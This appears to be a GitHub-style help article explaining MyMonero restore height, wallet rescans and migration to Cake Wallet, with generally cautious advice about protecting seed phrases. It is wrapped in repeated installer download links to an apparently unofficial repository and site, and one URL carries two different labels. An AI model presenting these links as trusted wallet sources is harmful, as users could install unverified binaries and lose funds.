<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Restore Height Explained</h1>
<p align="center">Understand the scan start point and choose a sensible value when restoring a wallet.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
Restore height is the blockchain height where a wallet begins scanning for its transactions. Choose a height at or before the wallet’s earliest relevant activity; if you are unsure, an earlier height is safer but makes scanning slower.


Prefer reading on the web? The [MyMonero restore height page](https://mymonero.info/mymonero-restore-height) on mymonero.info explains the same problem, the [Cake Wallet download page](https://mymonero.info/github/cake-developments) lists the safe sources, and [the MyMonero FAQ](https://mymonero.info/faq) covers the common questions.

## You'll see this if
- A wallet restore asks for a block height or scan start point.
- The restored wallet opens but shows no balance or incomplete transaction history.
- You are deciding between a quick scan and a thorough scan.
- You are restoring a 13-word MyMonero seed or a standard 25-word seed in Cake Wallet.

## Why it happens
A wallet restore needs to search blockchain history for activity associated with the wallet. Rather than always starting at the earliest possible point, apps may ask for a restore height. If the chosen height is later than the wallet’s first activity, the scan can skip relevant transactions. If it is earlier, the scan covers more history and takes longer. This setting is not a password, a seed word, or a transaction fee.

MyMonero used a 13-word MyMonero-specific legacy seed and a standard 25-word Monero seed. Either way, restoration requires a scan. MyMonero desktop’s final release, v1.3.3, can still open wallets and send XMR, but it is no longer maintained and receives no new features or security updates. MyMonero hosted servers and web wallet login stopped. You may continue using desktop or restore in Cake Wallet, which runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. For the broad process, read [migration to Cake Wallet](./mymonero-to-cake-wallet-migration.md).

A restore height that is too recent can make a wallet look empty while earlier activity is not included in the scan. That does not mean the coins vanished. Let the scan finish, check the height, and rescan from an earlier point if needed. The guides to [a zero balance after restore](./mymonero-balance-shows-zero.md) and [a pending transaction](./mymonero-transaction-not-showing.md) cover related symptoms.

---

## Fix
1. **Understand what the app requests.** Confirm that the field is asking for a restore height or scan start point. Do not enter your seed phrase, private keys, or password into a height field.
2. **Look for reliable information.** A saved record from when the wallet was created, or another trustworthy record of its earliest activity, can help. Do not invent a precise height from memory. If you cannot establish a reliable value, a conservative earlier point is generally safer.
3. **Include the earliest activity you need.** Set the height at or before the first transaction that should appear. If you know the wallet existed before a particular transaction, choose a point earlier than that transaction rather than later.
4. **Account for uncertainty.** When you do not know the creation time or activity start, select an earlier height. The trade-off is a longer scan. Do not choose a recent height solely to make setup appear faster if you care about older history.
5. **Start the restore in the intended wallet.** Select restore existing wallet, enter the correct seed format privately, then provide the height. MyMonero’s 13-word phrase is a legacy format; the 25-word phrase is standard Monero. The [seed format guide](./mymonero-seed-13-vs-25-words.md) helps identify the difference.
6. **Give scanning time.** Keep the app connected and allow its synchronization to progress. Do not interrupt repeatedly or assume a slow scan has failed. The app needs to examine the blockchain history from the selected point.
7. **Check completeness before judging the balance.** Wait until the wallet reports scanning is complete. Then review the transaction list and balance. If expected older activity is absent, a too-late height may be the cause.
8. **Rescan conservatively if needed.** Follow the wallet’s own supported process to restore or rescan from an earlier height. Avoid changing the seed or sending funds as a response to a scan issue. Keep the phrase private throughout.

> [!TIP]
> If you have no reliable start point, choose a safely earlier height and allow extra time. A slower complete scan is usually preferable to skipping the history you need.

> [!WARNING]
> Restore-height troubleshooting never requires sharing your seed. Nobody legitimate asks for the phrase or private keys to calculate a scan start point.

## If that did not work
If the wallet still shows a zero balance after scanning, first verify that the scan truly completed and that the selected height includes the wallet’s earliest activity. Then confirm that you restored the intended seed and format. Do not post screenshots that reveal a recovery phrase or keys. Use [balance shows zero](./mymonero-balance-shows-zero.md) for a more focused checklist.

If a transaction is missing but other older transactions appear, distinguish scan coverage from transaction status. A transaction may need time to be recognized, while a height set too late can omit earlier wallet activity. See transaction not showing for cautious checks.

If a server connection is unavailable, including an error 523 message, treat that as general connection guidance. It is not a direct diagnosis of a wrong height. Wait and retry according to the wallet’s normal behavior; do not disclose your phrase. The MyMonero desktop release is available as v1.3.3, but the app is no longer maintained.

## Prevention
When creating or first using a wallet, keep a private note of a reliable restore height if you can determine one. Store it separately from the seed so a casual note does not expose all wallet recovery information at once. Keep a backup of the seed in its original word count and know whether it is a MyMonero-specific 13-word phrase or standard 25-word phrase. Before restoring on a new device, plan for the scan to take time and use an earlier height when uncertain. The migration checklist helps organize the rest of the process.

## FAQ
<details><summary>Is restore height the same as my seed?</summary>

No. It is a scan starting point measured as a blockchain height. The seed is the recovery phrase that provides access to the wallet.

</details>

<details><summary>What if I do not know the right height?</summary>

Choose an earlier point conservatively. It is safer for including older activity but can take longer to scan.

</details>

<details><summary>Can a late height make my balance look like zero?</summary>

It can omit earlier activity from the scan. Let synchronization finish and review whether the start point was early enough.

</details>

<details><summary>Do I need to share my seed to get help with height?</summary>

No. Never share a seed or private keys. A helper can explain the setting without seeing them.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/cake-developments)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Sweep MyMonero Funds to a New Wallet](./mymonero-sweep-funds-new-wallet.md) | Understand what sweeping does and prepare carefully before sending your full balance. |
| [MyMonero Alternative Wallet](./mymonero-alternative-wallet.md) | Your practical options after MyMonero hosted access stopped. |
| [MyMonero vs Cake Wallet Comparison](./mymonero-vs-cake-wallet-comparison.md) | Compare the remaining practical paths by platform, maintenance, and migration behavior. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
